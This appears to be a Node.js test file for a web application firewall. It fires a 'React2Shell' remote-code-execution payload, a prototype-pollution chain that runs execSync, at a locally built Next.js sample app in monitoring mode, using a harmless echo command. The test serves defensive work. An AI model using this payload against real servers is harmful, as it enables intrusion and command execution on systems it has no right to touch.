import { spawnSync, spawn } from "child_process";
import { resolve } from "path";
import { test, before } from "node:test";
import { equal, fail, match } from "node:assert";
import { getRandomPort } from "./utils/get-port.mjs";
import { timeout } from "./utils/timeout.mjs";

const pathToAppDir = resolve(
  import.meta.dirname,
  "../../sample-apps/react2shell-next"
);
const port = await getRandomPort();

before(() => {
  const { stderr } = spawnSync(`npm`, ["run", "build"], {
    cwd: pathToAppDir,
  });

  if (stderr && stderr.toString().length > 0) {
    throw new Error(`Failed to build: ${stderr.toString()}`);
  }
});

function sendReact2ShellRequest(port) {
  // Based on https://github.com/assetnote/react2shell-scanner/

  const cmd = "echo $((41*271))";

  const prefixPayload =
    "var res=process.mainModule.require('child_process').execSync('{cmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});".replace(
      "{cmd}",
      cmd
    );

  const part0 =
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"${prefixPayload}","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'.replace(
      "{prefixPayload}",
      prefixPayload
    );

  // Build the multipart body as a string
  const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
  const parts = [];
  parts.push(
    `${boundary}\r\n` +
      'Content-Disposition: form-data; name="0"\r\n\r\n' +
      `${part0}\r\n`
  );
  parts.push(
    `${boundary}\r\n` +
      'Content-Disposition: form-data; name="1"\r\n\r\n' +
      '"$@0"\r\n'
  );
  parts.push(
    `${boundary}\r\n` +
      'Content-Disposition: form-data; name="2"\r\n\r\n' +
      "[]\r\n"
  );
  parts.push(`${boundary}--`);
  const body = parts.join("");

  return fetch(`http://127.0.0.1:${port}/`, {
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
      "Next-Action": "x",
      "X-Nextjs-Request-Id": "b5dce965",
      "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
      "Content-Type": `multipart/form-data; boundary=${boundary.slice(2)}`,
    },
    body,
    method: "POST",
  });
}

test("Request is not blocked in monitoring mode", async () => {
  const server = spawn(
    `node`,
    ["-r", "@aikidosec/firewall", "./.next/standalone/server.js"],
    {
      cwd: pathToAppDir,
      env: {
        ...process.env,
        AIKIDO_DEBUG: "true",
        AIKIDO_BLOCK: "false",
        PORT: port,
        HOSTNAME: "127.0.0.1",
      },
    }
  );

  try {
    server.on("error", (err) => {
      fail(err.message);
    });

    let stdout = "";
    server.stdout.on("data", (data) => {
      stdout += data.toString();
    });

    let stderr = "";
    server.stderr.on("data", (data) => {
      stderr += data.toString();
    });

    // Wait for the server to start
    await timeout(2000);

    const result = await sendReact2ShellRequest(port);

    equal(result.status, 500);
    const response = await result.text();
    equal(response.includes('E{"digest":"'), true);

    match(stdout, /Starting agent/);
    //match(stderr, /Zen has blocked an SQL injection/);
  } catch (err) {
    fail(err);
  } finally {
    server.kill();
  }
});
